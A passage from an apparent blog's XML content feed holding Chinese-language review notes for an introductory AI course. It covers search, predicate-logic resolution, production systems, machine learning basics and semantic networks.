face="华文彩云" size="5" color="red"> $\alpha-\beta$ 剪枝（重点）</font></h4><ul><li>能利用 $\alpha-\beta$ 剪枝方法判断博弈树中需要剪枝的部分</li></ul><h3 id="4-font-face-华文彩云-size-5-color-green-蒙特卡洛树搜索（了解）-font">4. <font face="华文彩云" size="5" color="green">蒙特卡洛树搜索（了解）</font></h3><h4 id="4-1-UCB-方法的设计思想">4.1 UCB 方法的设计思想</h4><h4 id="4-2-掌握蒙特卡洛树搜索的基本原理及搜索过程">4.2 掌握蒙特卡洛树搜索的基本原理及搜索过程</h4><h4 id="4-3-了解-AlphaGo-中蒙特卡洛树搜索的应用方法">4.3 了解 AlphaGo 中蒙特卡洛树搜索的应用方法</h4><h2 id="五、机器学习初步">五、机器学习初步</h2><h3 id="1-机器学习的概念及分类">1. 机器学习的概念及分类</h3><ul><li>有监督</li><li>无监督</li><li>强化学习</li></ul><h3 id="2-有监督">2. 有监督</h3><h4 id="2-1-回归">2.1 回归</h4><ul><li>线性回归<ul><li>了解线性回归模型的工作原理</li><li>了解损失函数，学习率，梯度下降等概念</li></ul></li></ul><h4 id="2-2-分类">2.2 分类</h4><ul><li>KNN 算法<ul><li>掌握 KNN 算法的原理及其特点</li><li>k 值对算法的影响</li></ul></li></ul><h3 id="3-无监督">3. 无监督</h3><h4 id="3-1-聚类">3.1 聚类</h4><ul><li>K-means<ul><li>相似性度量-欧氏距离，余弦相似度等</li><li>掌握 Kmeans 算法的原理，及其特点</li></ul></li></ul><h3 id="4-强化学习">4. 强化学习</h3><p>了解强化学习的思想</p><h3 id="5-人工神经网络">5. 人工神经网络</h3><h4 id="5-1-感知机">5.1 感知机</h4><ul><li>基本原理——线性分类</li><li>了解感知机的不足</li></ul><h4 id="5-2-多层感知机">5.2 多层感知机</h4><h4 id="5-3-卷积神经网络">5.3 卷积神经网络</h4><ul><li>了解 CNN 的设计思想</li><li>掌握卷积，卷积核，填充，步幅，池化等概念</li><li>理解 CNN 的架构及工作原理</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能（二）</title>
      <link href="/p/dbf45802.html"/>
      <url>/p/dbf45802.html</url>
      
        <content type="html"><![CDATA[<h1>人工智能复习（二）</h1><h2 id="三、推理">三、推理</h2><h3 id="1-推理的基本概念">1. 推理的基本概念</h3><p>推理就是按照某种策略从已有事实和知识推出结论的过程。</p><p><strong>按推理的逻辑基础分类</strong></p><ol><li><p>演绎推理</p><p>从已知的一般性知识出发，推理出适合于某种个别情况的结论过程。<br>即从一般到个别的推理。<br>常用形式：三段论法(大前提、小前提、结论)</p><blockquote><p>大前提：是已知的一般性知识或推理过程得到的判断；<br>小前提：是关于某种具体情况或某个具体实例的判断；<br>结论：是由大前提推出的，并且适合于小前提的判断。</p></blockquote> <img src="/p/dbf45802/image-20221112224143886.png" class title="image-20221112224143886"></li><li><p>归纳推理</p><p>从大量特殊事例出发，归纳出一般性结论的推理过程。</p> <img src="/p/dbf45802/image-20221112224242848.png" class title="image-20221112224242848"></li></ol><p><strong>按所用知识的确定性分类</strong></p><ol><li><p>确定性推理</p><p>推理时所有用的知识和证据都是确定的，推出的结论也是确定的，其真值或者为真或者为假，没有第三种情况出现。</p></li><li><p>不确定性推理</p><p>推理时所用的知识和证据不都是确定的，推出的结论也不确定的。</p></li></ol><p><strong>按推理中所用知识是否具有启发性分类</strong></p><ol><li><p>启发式推理</p><p>推理过程中应用与问题有关的启发性知识，即解决问题的的策略、技巧及经验，以加快推理过程，提高搜索效率。</p></li><li><p>非启发式推理</p><p>在推理过程中，不运用启发性知识，只按照一般的控制逻辑进行推理。这种方法缺乏对求解问题的针对性，所以推理效率较低，容易出现“组合爆炸”问题。</p></li></ol><p><strong>推理的控制策略</strong></p><p>推理的控制策略是指如何使用领域知识使推理过程尽快达到目标的策略。</p><ul><li><p>由于智能系统的推理过程一般表现为一种搜索过程，因此，推理的控制策略又可分为<font color="blue">推理策略</font>和<font color="blue">搜索策略</font>。</p><ul><li><p><font color="blue">推理策略</font></p><p><strong>推理方向控制策略</strong>用于确定推理的控制方向，可分为正向推理、逆向推理、混合推理及双向推理。</p><p><strong>求解策略</strong>是指仅求一个解，还是求所有解或最优解等。</p><p><strong>限制策略</strong>是指对推理的深度、宽度、时间、空间等进行的限制。</p><p><strong>冲突消解策略</strong>是指当推理过程有多条知识可用时，如何从这多条可用知识中选出一条最佳知识用于推理的策略。</p></li></ul></li><li><p><font color="blue">搜索策略</font></p><ul><li>主要解决<strong>推理线路</strong>、<strong>推理效果</strong>、<strong>推理效率</strong>等问题。</li></ul></li></ul><h3 id="2-确定性-谓词逻辑推理">2. 确定性/谓词逻辑推理</h3><h4 id="2-1-谓词逻辑基础介绍">2.1 谓词逻辑基础介绍</h4><ul><li><p>谓词的真假，谓词公式的等价性，永真蕴含式，置换与合一</p></li><li><p>$a⊕b = (¬a ∧ b) ∨ (a ∧¬b)$</p></li><li><img src="/p/dbf45802/image-20221113120750212.png" class title="image-20221113120750212"><img src="/p/dbf45802/image-20221113120807284.png" class title="image-20221113120807284"><img src="/p/dbf45802/image-20221113120822166.png" class title="image-20221113120822166"><img src="/p/dbf45802/image-20221113120837388.png" class title="image-20221113120837388"><img src="/p/dbf45802/image-20221113120922424.png" class title="image-20221113120922424"><img src="/p/dbf45802/image-20221113121909964.png" class title="image-20221113121909964"><img src="/p/dbf45802/image-20221113122019661.png" class title="image-20221113122019661"><img src="/p/dbf45802/image-20221113122206768.png" class title="image-20221113122206768"> <img src="/p/dbf45802/image-20221113122332827.png" class title="image-20221113122332827"></li><li><p><font color="green" size="4">置换与合一</font></p></li><li><img src="/p/dbf45802/image-20221113123106514.png" class title="image-20221113123106514"></li><li><img src="/p/dbf45802/image-20221113123007632.png" class title="image-20221113123007632"></li><li><img src="/p/dbf45802/image-20221113123325397.png" class title="image-20221113123325397"> <img src="/p/dbf45802/image-20221113123801261.png" class title="image-20221113123801261"><p>即删去（1）分子分母相除为1的结果，（2）删除 $\theta$ 和 $\lambda$ 中共有的分母</p></li><li><img src="/p/dbf45802/image-20221113124315580.png" class title="image-20221113124315580"></li><li><img src="/p/dbf45802/image-20221113124440362.png" class title="image-20221113124440362"><img src="/p/dbf45802/image-20221113124615181.png" class title="image-20221113124615181"></li><li><img src="/p/dbf45802/image-20221113130217646.png" class title="image-20221113130217646"><img src="/p/dbf45802/image-20221113130241204.png" class title="image-20221113130241204"><img src="/p/dbf45802/image-20221113130251806.png" class title="image-20221113130251806"><img src="/p/dbf45802/image-20221113130302155.png" class title="image-20221113130302155"><img src="/p/dbf45802/image-20221113130312441.png" class title="image-20221113130312441"></li></ul><h4 id="2-2-font-face-华文彩云-size-5-color-red-谓词逻辑的自然演绎推理（重点）-font">2.2 <font face="华文彩云" size="5" color="red">谓词逻辑的自然演绎推理（重点）</font></h4><p><strong>从一组已知为真的事实出发，直接运用命题逻辑或谓词逻辑中的推理规则推出结论的过程。</strong></p><p>最基本的推理规则有：</p><ol><li><strong>假言三段论</strong></li></ol> <img src="/p/dbf45802/image-20221113130723052.png" class title="image-20221113130723052"><ol start="2"><li><strong>假言推理</strong></li></ol> <img src="/p/dbf45802/image-20221113130736600.png" class title="image-20221113130736600"><ol start="3"><li><strong>拒取式</strong></li></ol> <img src="/p/dbf45802/image-20221113130821140.png" class title="image-20221113130821140"> <img src="/p/dbf45802/image-20221113131040596.png" class title="image-20221113131040596"> <img src="/p/dbf45802/image-20221113131249942.png" class title="image-20221113131249942"> <img src="/p/dbf45802/image-20221113132010112.png" class title="image-20221113132010112"><h4 id="2-3-font-face-华文彩云-size-5-color-red-谓词逻辑的归结演绎推理（重点）-font">2.3 <font face="华文彩云" size="5" color="red">谓词逻辑的归结演绎推理（重点）</font></h4><p><strong>归结原理除了可用于定理证明外，还可用来求取问题答案,其思想与定理证明相似。</strong></p><p>下面给出求取问题答案的一般步骤:</p><p>(1)把问题的已知条件用谓词公式表示出来,并化为相应的子句集;</p><p>(2)把问题的目标的否定用谓词公式表示出来,并化为子句集;</p><p>(3)对目标否定子句集中的每个子句,构造该子句的重言式(即把该目标否定子句和此目标否定子句的否定之间再进行析取所得到的子句),用这些重言式代替相应的目标否定子句式,并把这些重言式加人到前提子句集中,得到一个新的子句集;</p><p>(4)对这个新的子句集,应用归结原理求出其证明树,这时证明树的根子句不为空,称这个证明树为修改证明树;</p><p>(5)用修改证明树的根子句作为回答语句.则答案就在此根子句中。</p><ul><li>子句集的化简步骤<ol><li>消去连接词</li><li>减少否定符号的辖域</li><li>对变元标准化</li><li>化为前束范式</li><li>消去存在量词</li><li>化为Skolem标准形</li><li>消去全称量词</li><li>消去全称量词</li><li>更换变量名称</li></ol></li></ul> <img src="/p/dbf45802/image-20221113164530578.png" class title="image-20221113164530578"> <img src="/p/dbf45802/image-20221113164553499.png" class title="image-20221113164553499"> <img src="/p/dbf45802/image-20221113164606050.png" class title="image-20221113164606050"> <img src="/p/dbf45802/image-20221113164619815.png" class title="image-20221113164619815"> <img src="/p/dbf45802/image-20221113164636269.png" class title="image-20221113164636269"><p><font color="blue" size="4">例题：</font></p><p>已知：张和李是同班同学，如果x和y是同班同学，则x的教室也是y的教室，现在张在302教室，上课。</p><p>问：现在李在哪个教室上课？</p><p><font face="华文琥珀">解：</font></p><ul><li><p>首先定义谓词：</p><p>$C(x, y)$ x和y是同班同学；</p><p>$A1(x, u)$ x在u教室上课。</p></li><li><p>把已知前提用谓词公式表示如下:</p><p>$C(zhang，li)$</p><p>$(\forall r)(\forall y)(\forall u)(C(x, y) \wedge At(x, u) \rightarrow At(y, u))$</p><p>$At(zhang, 302)$</p></li><li><p>把目标的否定用谓词公式表示如下：</p><p>$\neg (\exists v)At(li, v)$</p></li><li><p>把上述公式化为子句集：</p><p>$C(zhang, li)$</p><p>$\neg C(x, y) \vee  \neg At(x，u) \vee At(y, u)$</p><p>$At(zhang,302)$</p></li><li><p>把目标的否定化成子句式，并用重言式</p><p>$\neg At(li, v) \vee At(li,v)$</p> <img src="/p/dbf45802/image-20221113154030832.png" class title="image-20221113154030832"></li></ul><h3 id="2-3-1-命题逻辑的归结反演">2.3.1 命题逻辑的归结反演</h3> <img src="/p/dbf45802/image-20221113160323882.png" class title="image-20221113160323882"><p><font color="green">例题1</font></p> <img src="/p/dbf45802/image-20221113160407490.png" class title="image-20221113160407490"><h3 id="2-3-2-谓词逻辑的归结演绎推理">2.3.2 谓词逻辑的归结演绎推理</h3> <img src="/p/dbf45802/image-20221113160742702.png" class title="image-20221113160742702"> <img src="/p/dbf45802/image-20221113160756059.png" class title="image-20221113160756059"> <img src="/p/dbf45802/image-20221113160809344.png" class title="image-20221113160809344"><p><font color="green" size="4">归结演绎的经典例子：</font></p> <img src="/p/dbf45802/image-20221113160933236.png" class title="image-20221113160933236"> <img src="/p/dbf45802/image-20221113160943539.png" class title="image-20221113160943539"> <img src="/p/dbf45802/image-20221113160954390.png" class title="image-20221113160954390"> <img src="/p/dbf45802/image-20221113161005288.png" class title="image-20221113161005288"><p><font color="green" size="4">归结反演求取答案的例子：</font></p> <img src="/p/dbf45802/image-20221113161412442.png" class title="image-20221113161412442"> <img src="/p/dbf45802/image-20221113161429988.png" class title="image-20221113161429988"> <img src="/p/dbf45802/image-20221113161445335.png" class title="image-20221113161445335"> <img src="/p/dbf45802/image-20221113161510936.png" class title="image-20221113161510936"> <img src="/p/dbf45802/image-20221113161538525.png" class title="image-20221113161538525"><p><font color="green" size="4">再来一题</font></p> <img src="/p/dbf45802/image-20221113161931562.png" class title="image-20221113161931562"> <img src="/p/dbf45802/image-20221113161940715.png" class title="image-20221113161940715"> <img src="/p/dbf45802/image-20221113161951692.png" class title="image-20221113161951692"><ul><li><strong>归结策略</strong></li></ul><img src="/p/dbf45802/image-20221113161734495.png" class title="image-20221113161734495"><h3 id="3-不确定性推理">3. 不确定性推理</h3><p>从不确定性的初始证据出发，通过运用不确定性的知识，最终推出具有一定程度的不确定性但却是合理或者近乎合理的结论的思维过程。</p><h4 id="3-1-不确定性推理的分类">3.1 不确定性推理的分类</h4><ul><li>不确定性推理中的基本问题<br>1.   不确定性的表示与量度<br>2.   不确定性匹配算法及阈值的选择<br>3.   组合证据不确定性的算法<br>4.   不确定性的传递算法<br>5.   结论不确定性的合成</li><li>证据理论<ol><li>概率分配函数</li><li>信任函数</li><li>似然函数</li><li>概率分配函数的正交和（证据的组合）</li><li>基于证据理论的不确定性推理</li></ol></li></ul><h2 id="实战练手">实战练手</h2><blockquote><p>二、证明G是否为F1, F2的逻辑结论。</p><p>$F1: (∀x)(P(x)→(∀y)(Q(y)→﹁L(x.y)))$ ，<br>$F2:  (∃x)(P(x)∧(∀y)(R(y)→L(x.y)))$<br>$G:   ( ∀x)(R(x)→﹁Q(x))$</p></blockquote><p><font face="华文琥珀">解：</font></p><ol><li><p>先把 G 否定，放入与 F1， F2 放在一起</p><p>${F1, F2, \neg G}$</p></li><li><p>把 ${F1, F2, \neg G}$ 化为子句集</p><ol><li>$\neg P(x) \vee \neg Q(y) \vee \neg L(x,y)$</li><li>$P(m)$</li><li>$\neg R(m) \vee L(m,n)$</li><li>$R(u)$</li><li>$Q(v)$</li></ol></li><li><p>对上式进行归结</p><p>1 与 2 归结，取 $\sigma = {m/x,n/y}$</p><ol start="6"><li>$\neg Q(n) \vee \neg L(m, n)$</li></ol><p>3 与 6 归结</p><ol start="7"><li>$\neg R(m) \vee \neg Q(m)$</li></ol><p>4, 5, 7 归结，取 $\sigma = {u/m, v/n}$</p></li><li><p>最终归结为 NIL</p></li></ol><p>因此，G 是 F1, F2 的逻辑结论。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能（一）</title>
      <link href="/p/ebe2b4da.html"/>
      <url>/p/ebe2b4da.html</url>
      
        <content type="html"><![CDATA[<h1>人工智能复习（一）</h1><h2 id="复习任务安排">复习任务安排</h2><div class="checkbox green"><input type="checkbox">            <p>过一遍PPT上的知识点</p>            </div><div class="checkbox yellow"><input type="checkbox">            <p>每章作业题</p>            </div><div class="checkbox red"><input type="checkbox">            <p>一套模拟卷</p>            </div><h2 id="一、概述">一、概述</h2><h3 id="1-人工智能的概念">1. 人工智能的概念</h3><p><font color="green">概念的定义:</font></p><ul><li>概念名：一个词语，属于符号体系（认知世界）</li><li>概念内涵：命题（判断出真假）（内心世界）</li><li>概念外延：满足内涵表示的对象集合（可观可测）（物理世界）</li></ul><p><strong>人工智能：</strong> 人工智能是人工方法实现的智能</p><p><strong>智能：</strong> 智慧和能力</p><p>人工智能的层次：</p><ul><li>高层智能</li><li>中层智能</li><li>低层智能</li></ul><p><strong>典型的四种定义方法：</strong> 类人，理性，思维，行为<img src="/p/ebe2b4da/image-20221111130550836.png" class title="image-20221111130550836"></p><h3 id="2-历史，流派">2. 历史，流派</h3><p><strong>人工智能研究的三大学派：</strong></p><ul><li>符号主义流派：基于符号运算，认为知识可以用符号来表示，认知可以通过符号运算来实现。<ul><li>运用计算机科学的方法（逻辑演绎）</li><li>例如，图灵测试，专家系统和知识工程，中文屋测试</li></ul></li><li>联结主义流派：神经网络学派<ul><li>运用仿生学的方法（网络连接机制）</li><li>例如，深度学习，缸中之脑实验</li></ul></li><li>行为主义流派：进化主义学派<ul><li>运用进化论的思想（控制论和机器学习算法）</li><li>例如，在动态环境中漫游的有六条腿的机器虫，波士顿机器人，完美伪装者和斯巴达</li></ul></li></ul><p>如今三大学派综合集成，取长补短，相互结合： AlphaGo ZERO</p><p><strong>标志人工智能诞生的事件：</strong> Dartmouth 会议</p><h3 id="3-研究及应用领域">3. 研究及应用领域</h3><p>机器思维：搜索</p><p>机器感知：利用计算机来模拟实现人类视觉的功能，使计算机具有通过二维图像认知三维环境信息的能力。</p><ol><li>计算机视觉</li><li>模式识别：让计算能够对给定事物进行鉴别，并把它归入与其相同或相似的模式中。被鉴别的事物可以是物理的，化学的、生理的，也可以是文字、声音图像等。</li><li>自然语言处理：研究人类与计算机之间进行有效交流的各种理论和方法。</li></ol><p>机器行为：智能控制和制造</p><h2 id="二、知识表示">二、知识表示</h2><h3 id="1-知识及知识表示的基本概念">1. 知识及知识表示的基本概念</h3><p><strong>知识：</strong> 有关信息关联在一起所形成的信息结构</p> <img src="/p/ebe2b4da/image-20221111141244049.png" class title="image-20221111141244049"><h3 id="2-font-face-华文彩云-size-6-color-red-表示方法（重点）-font">2. <font face="华文彩云" size="6" color="red">表示方法（重点）</font></h3><p>知识表示就是将人类的知识形式化或者模型化，以便于计算机存储与处理。</p><h4 id="2-1-一阶谓词逻辑表示法">2.1 一阶谓词逻辑表示法</h4><p>它以数理逻辑为基础，是到目前为止能够表达人类思维活动规律的一种最精确的形式语言。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">命题</span><br><span class="line">    断言: 一个陈述句称为一个断言.</span><br><span class="line">    命题: 具有真假意义的断言称为命题. </span><br><span class="line">真值</span><br><span class="line">    T: 表示命题的意义为真</span><br><span class="line">    F: 表示命题的意义为假</span><br><span class="line">说明:</span><br><span class="line">    一个命题不能同时既为真又为假</span><br><span class="line">    一个命题可在一定条件下为真，而在另一条件下为假</span><br><span class="line">论域</span><br><span class="line">    由所讨论对象的全体构成的集合。也称为个体域</span><br><span class="line">    论域中的元素称为个体</span><br></pre></td></tr></table></figure><p><font color="green">连接符号的使用</font></p><blockquote><ul><li>$\neg$ : “机器人不在2号房间”，可表示为</li></ul><p>$$<br>\neg INROOM(Robot, R2)<br>$$</p><ul><li>$\wedge$ : “我喜欢音乐和绘画”，可表示为</li></ul><p>$$<br>LIKE(I, Music) \wedge LIKE(I, Painting)<br>$$</p><ul><li>$\vee$ : “小张打篮球或踢足球”，可表示为</li></ul><p>$$<br>PLAY(Zhang, Basketball) \vee PLAY(Zhang, football)<br>$$</p><ul><li>$\rightarrow$ : “如果小王跑得最快，那么他获得冠军。”</li></ul><p>$$<br>RUN(Wang, Fastest) \rightarrow WIN(Wang, Champion)<br>$$</p><ul><li>$\leftrightarrow$ : “燕子飞回北方，春天来了。”</li></ul><p>$$<br>FLY(Swallow, North) \leftrightarrow Is(Spring)<br>$$</p></blockquote><p><font color="green">关于量词的使用</font></p><blockquote><p>(1) 所有的人都是要死的。</p><p>(2) 有的人活到100岁以上。</p><p><strong>在个体域D为人类集合时，可符号化为：</strong></p><p>(1) $(\forall x)P(x)$ ，其中 $P(x)$ 表示 $x$ 是要死的</p><p>(2) $(\exists x)Q(x)$ ，其中 $Q(x)$ 表示 $x$ 活到 100 岁以上</p></blockquote><p>一阶谓词表达式虽然准确，但是繁琐，下面看看有多繁琐</p><p><font color="purple" size="4">例题1：猴子摘香蕉</font></p><img src="/p/ebe2b4da/image-20221111214130946.png" class title="image-20221111214130946"><p><font face="华文琥珀" size="4">解：</font></p><ul><li><strong>分别定义描述状态得谓词：</strong></li></ul><p>$SITE(x, y):x在y处$</p><p>$ON (z):z站在箱子上$</p><p>$HANG(w,y):w悬挂在y处$</p><p>$HOLDS(z): z手里拿着香蕉$</p><ul><li><strong>变元的个体域</strong></li></ul><p>$x的个体域是{Monkey, Box} \<br>y的个体域是{a, b, c} \<br>z的个体域是{Monkey} \<br>w的个体域是{Banana}$</p><ul><li><strong>初始状态</strong></li></ul><p>$S_0=SITE(Monkey, a) \ \wedge HANG(Banana, b) \ \wedge SITE(Box, a) \ \wedge \neg ON(Monkey) \ \wedge \neg HOLDS(Monkey)$</p><ul><li><strong>目标状态</strong></li></ul><p>$S_g = SITE(Monkey, b) \ \wedge \neg HANG(Banana, b) \ \wedge SITE(Box, b) \ \wedge ON(Monkey) \ \wedge HOLDS(Monkey)$</p><ul><li><strong>定义四个操作</strong></li></ul><p>$Goto(u,v): 猴子从 u 走到 v 处。\<br>Pushbox(v,w):猴子推着箱子从v 走到w 处。\<br>Climbbox:  猴子爬上箱子。\<br>Grasp:  猴子摘到香蕉。$</p><ul><li><strong>各种操作的条件和动作</strong></li></ul><p>$Goto(u,v)$</p><p><strong>条件：</strong> $\neg ON(Monkey), SITE(Monkey, u)$</p><p><strong>动作：</strong> 删除表：$SITE(Monkey, u)$添加表：$SITE(Monkey, v)$</p><p>$Pushbox(v,w)$</p><p><strong>条件：</strong> $\neg ON(Monkey), SITE(Monkey, v), SITE(Box, v)$</p><p><strong>动作：</strong> 删除表： $SITE(Monkey, v), SITE(Box, v)$</p><p>​添加表： $SITE(Monkey, w),SITE(Box, w)$</p><p>$Climbbox$</p><p><strong>条件：</strong> $\neg ON(Monkey),SITE(Monkey, w),SITE(Box, w)$</p><p><strong>动作：</strong> 删除表： $\neg ON(Monkey)$添加表：$ON(Monkey)$</p><p>$Grasp$</p><p><strong>条件：</strong> $ON(Monkey),SITE(Box, b),SITE(Banana,b)$</p><p><strong>动作：</strong> 删除表： $\neg HOLD(Monkey),HANG(Banana,b)$</p><p>​添加表： $HOLD(Monkey),\neg HAND(Banana,b)$</p><p><font color="blue">至此一阶谓词逻辑的推理基础就搭建好了，下面进行猴子摘香蕉问题的求解</font></p><img src="/p/ebe2b4da/image-20221111221345787.png" class title="image-20221111221345787"> <img src="/p/ebe2b4da/image-20221111221504106.png" class title="image-20221111221504106"><h4 id="2-2-产生式表示法">2.2 产生式表示法</h4><p>规则的产生式表示形式常称为产生式规则，简称产生式或规则。</p><ul><li><p><strong>知识的产生式表示方法</strong><br>$$<br>P \rightarrow Q<br>$$<br>或者<br>$$<br>IF \space\space\space P \space\space\space THEN \space\space\space Q<br>$$<br>$P$ 是产生式的前提，也称前件。它给出了该产生式可否使用的先决条件。</p><p>$Q$ 是一组结论或操作，也称后件。它指出当 $P$ 满足时，应该推出的结论或者应该执行的动作。</p><p><font color="orange">知识产生式的表示方法：</font></p>   <img src="/p/ebe2b4da/image-20221111205026370.png" class title="image-20221111205026370"></li><li><p><strong>产生式系统的基本结构</strong></p>  <img src="/p/ebe2b4da/image-20221111211107488.png" class title="image-20221111211107488"><ul><li><p>综合数据库 DB(Data Base)</p><p>存放推理过程的 <strong>初始状态</strong> ， <strong>输入的事实</strong> ， <strong>中间结论</strong> 及 <strong>最终结论</strong></p></li><li><p>规则库 RB(Rule Base)，又称知识库 KB(Knowledge Base)</p><ol><li><strong>作用：</strong> 用于存放这个推理过程中所需要的所有规则，是整个产生式系统能够进行推理的根本。</li><li><strong>要求：</strong> 知识的完整性，一致性，准确性，灵活性和可组织性</li></ol></li><li><p>控制系统 (Control system)</p><p>推理机，执行推理过程</p></li></ul></li><li><p><strong>产生式系统的运行过程</strong></p> <img src="/p/ebe2b4da/image-20221111211935515.png" class title="image-20221111211935515"></li><li><p><strong>利用产生式表示方法求解问题</strong></p></li></ul><p><font color="purple" size="4">例题1：动物识别系统</font></p><blockquote><p>该系统可以识别老虎、金钱豹、斑马、长颈鹿、鸵鸟、企鹅、信天翁这7种动物。其规则库包含如下15条规则：<br>r1  IF 动物有毛发THEN 动物是哺乳动物<br>r2  IF 动物有奶THEN 动物是哺乳动物<br>r3  IF 动物有羽毛THEN 动物是鸟<br>r4  IF 动物会飞AND 动物会下蛋THEN 动物是鸟<br>r5  IF 动物吃肉THEN 动物是食肉动物<br>r6  IF 动物有犬齿AND 动物有爪AND 该物眼盯前方THEN 动物是食肉动物<br>r7  IF 动物是哺乳动物AND 动物有蹄THEN 动物是有蹄类动物<br>r8  IF 动物是哺乳动物AND 动物是反刍动物THEN 动物是有蹄类动物<br>r9  IF 动物是哺乳动物AND 动物是食肉动物AND 动物是黄褐色AND 动物身上有暗斑点THEN 动物是金钱豹<br>r10  IF 动物是哺乳动物AND 动物是食肉动物AND 动物是黄褐色 AND 动物身上有黑色条纹THEN 动物是虎<br>r11  IF 动物是有蹄类动物AND 动物有长脖子AND 动物有长腿AND 动物身上有暗斑点THEN 动物是长颈鹿<br>r12  IF 动物是有蹄类动物AND 动物身上有黑色条纹THEN 动物是斑马<br>r13  IF 动物是鸟AND 动物有长脖子AND 动物有长腿AND 动物不会飞AND 动物有黑白二色THEN 动物是鸵鸟<br>r14  IF 动物是鸟AND 动物会游泳AND 动物不会飞AND 动物有黑白二色THEN 动物是企鹅<br>r15  IF 动物是鸟AND 动物善飞THEN 动物是信天翁</p></blockquote><blockquote><p>其中，ri (i=1,2,…….,15)是规则的编号</p></blockquote><blockquote><p>初始综合数据库包含的事实有：<br>动物有暗斑点，动物有长脖子，动物有长腿，动物有奶，动物有蹄</p></blockquote><p><font color="blue" size="4">推理过程如下：</font></p><img src="/p/ebe2b4da/image-20221111212417523.png" class title="image-20221111212417523"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动物有暗斑，动物有长脖子，动物有长腿，动物有奶，动物有蹄， 动物是哺乳动物</span><br></pre></td></tr></table></figure><img src="/p/ebe2b4da/image-20221111212518269.png" class title="image-20221111212518269"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动物有暗斑，动物有长脖子，动物有长腿，动物有奶，动物有蹄，动物是哺乳动物，动物是有蹄类动物</span><br></pre></td></tr></table></figure><img src="/p/ebe2b4da/image-20221111212604282.png" class title="image-20221111212604282"><p><font color="purple" size="4">例题2：猴子摘香蕉</font></p><p><font face="华文琥珀" size="4">解：</font></p><ol><li><p>综合数据库： $(M, B, Box, On, H)$</p><p>$M:$   猴子的位置<br>$B$：  香蕉的位置<br>$Box$: 箱子的位置<br>$On=0$:   猴子在地板上<br>$On=1$:   猴子在箱子上<br>$H=0$:     猴子没有抓到香蕉<br>$H=1$:     猴子抓到了香蕉</p></li><li><p>规则集：</p><p>$r_1:  IF \space\space (x, y, z, 0, 0) \space\space THEN \space\space (w, y, z, 0, 0)$ ：猴子移动动</p><p>$r2: IF\space\space (x, y, x, 0, 0) \space\space THEN \space\space (z, y, z, 0, 0)$ ： 猴子和箱子一起移动</p><p>$r3: IF \space\space (x, y, x, 0, 0) \space\space THEN \space\space (x, y, x, 1, 0)$ ： 猴子跳到箱子上</p><p>$r4: IF \space\space (x, y, x, 1, 0) \space\space THEN \space\space (x, y, x, 0, 0)$ ： 猴子跳下箱子</p><p>$r5: IF \space\space (x, x, x, 1, 0) \space\space THEN \space\space (x, x, x, 1, 1)$ ： 猴子摘下香蕉</p><p>其中 $x, y, z, w$ 为变量。</p></li><li><p>初始状态： $(a,b,c,0,0)$</p></li><li><p>结束状态： $(b,b,b,1,1)$</p></li></ol><p><font color="blue">定义好 $DB$ 和 $RB$ 之后，就可以进行问题求解了</font></p><p>根据具体问题可将规则具体为：<br>$r1: IF \space\space  (a, b, c, 0, 0) \space\space  THEN  \space\space (c, b, c, 0, 0)$<br>$r2: IF \space\space (c, b, c, 0, 0) \space\space THEN \space\space (c, b, c, 0, 0)$<br>$r3: IF \space\space (b ,b, b, 0, 0) \space\space THEN \space\space (b, b, b, 1, 0)$<br>$r5: IF \space\space (b, b, b, 1, 0) \space\space THEN \space\space (b, b, b, 1, 1)$<br>在已知事实下，$r1 \rightarrow r2 \rightarrow r3 \rightarrow r5$ ,可得到香蕉</p><h4 id="2-3-语义网络表示法">2.3 语义网络表示法</h4><ul><li><p>语义网络：通过概念及语义关系来表示知识的一种网络图，它是一个带标注的有向图。</p><ul><li><strong>节点</strong>表示各种概念、事物、对象、行为、状态等；</li><li><strong>有向弧</strong>表示节点间的联系或关系。</li></ul></li><li><p>知识的语义网络表示方法</p><ul><li><p>一般由一些最基本的语义单元组成。这些最基本的语义单元被称为<font color="blue">语义基元</font>。可用如下三元组来表示：</p><p>(节点1，弧，节点2)</p></li><li><p>也可用有向图表示：</p> <img src="/p/ebe2b4da/image-20221111225104909.png" class title="image-20221111225104909"></li></ul></li><li><p>语义网络的表示实例：</p><p><font color="purple">例1：“小李和小王是朋友”</font></p><ul><li><p>语义网络表示</p> <img src="/p/ebe2b4da/image-20221111225351920.png" class title="image-20221111225351920"></li><li><p>一阶谓词逻辑表示</p><p>定义谓词：$Friend(x, y)$。定义个体词：$Li$:小李；$Wang$:小王<br>表示为：$Friend( Li, Wang)$</p></li></ul></li><li><p>基本语义关系</p><p>一个最主要的特征是属性的继承性，处在具体层的节点可以继承所有抽象层节点的所有属性。</p><ul><li><p>实例关系：<strong>ISA</strong> (is a)</p><p>体现的是<font color="orange">“具体与抽象”</font>的概念，含义为<font color="orange">“是一个”</font>，表示一个事物是另一个事物的一个实例。</p>   <img src="/p/ebe2b4da/image-20221111230101671.png" class title="image-20221111230101671"></li><li><p>分类关系：<strong>AKO</strong> (a kind of)</p><p>亦称泛化关系，体现的是<font color="orange">“子类与超类”</font>的概念，含义为<font color="orange">“是一种”</font>，表示一个事物是另一个事物的一种类型。</p>   <img src="/p/ebe2b4da/image-20221111230110221.png" class title="image-20221111230110221"></li><li><p>成员关系：<strong>A-Member-of</strong></p><p>体现的是<font color="orange">“个体与集体”</font>的关系，含义为<font color="orange">“是一员”</font>，表示一个事物是另一个事物的一个成员。</p>   <img src="/p/ebe2b4da/image-20221111230116982.png" class title="image-20221111230116982"></li><li><p>聚类关系：<strong>Part-of</strong></p><p>亦称包含关系。指具有组织或结构特征的<font color="orange">“部分与整体”</font>之间的关系,含义为<font 